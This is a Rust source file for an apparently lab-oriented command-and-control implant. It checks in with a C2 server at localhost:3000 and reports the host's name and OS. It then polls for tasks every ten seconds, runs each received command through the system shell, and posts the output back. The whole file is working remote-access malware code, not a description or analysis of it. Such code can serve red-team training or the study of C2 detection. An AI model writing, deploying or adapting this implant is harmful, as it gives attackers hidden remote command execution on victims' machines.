use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::{process::Command, time::Duration};
use uuid::Uuid;

#[derive(Serialize)]
struct CheckIn {
    hostname: String,
    os: String,
}

#[derive(Deserialize)]
struct CheckInResponse {
    id: String,
}

#[derive(Deserialize)]
struct Task {
    task: Option<TaskContent>,
}

#[derive(Deserialize)]
struct TaskContent {
    taskId: String,
    command: String,
}

#[derive(Serialize)]
struct TaskResult {
    taskId: String,
    output: String,
}

#[tokio::main]
async fn main() {
    let c2_url = "http://localhost:3000";
    let client = Client::new();

    // Get hostname
    let hostname = hostname::get()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    // Check in
    let checkin_payload = CheckIn {
        hostname,
        os: std::env::consts::OS.to_string(),
    };

    let response = client
        .post(format!("{}/implant/checkin", c2_url))
        .json(&checkin_payload)
        .send()
        .await
        .expect("Check-in failed");

    let CheckInResponse { id } = response
        .json::<CheckInResponse>()
        .await
        .expect("Failed to parse check-in response");

    println!("[*] Checked in as ID: {}", id);

    loop {
        // Fetch task
        let resp = client
            .get(format!("{}/implant/{}/task", c2_url, id))
            .send()
            .await;

        if let Ok(r) = resp {
            if let Ok(task) = r.json::<Task>().await {
                if let Some(t) = task.task {
                    println!("[>] Executing task: {}", t.command);
                    let output = run_command(&t.command);
                    let result = TaskResult {
                        taskId: t.taskId,
                        output,
                    };

                    let _ = client
                        .post(format!("{}/implant/{}/result", c2_url, id))
                        .json(&result)
                        .send()
                        .await;
                }
            }
        }

        tokio::time::sleep(Duration::from_secs(10)).await; // sleep/jitter
    }
}

fn run_command(cmd: &str) -> String {
    #[cfg(target_os = "windows")]
    let output = Command::new("cmd").args(["/C", cmd]).output();

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh").args(["-c", cmd]).output();

    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(e) => format!("Error executing command: {}", e),
    }
}
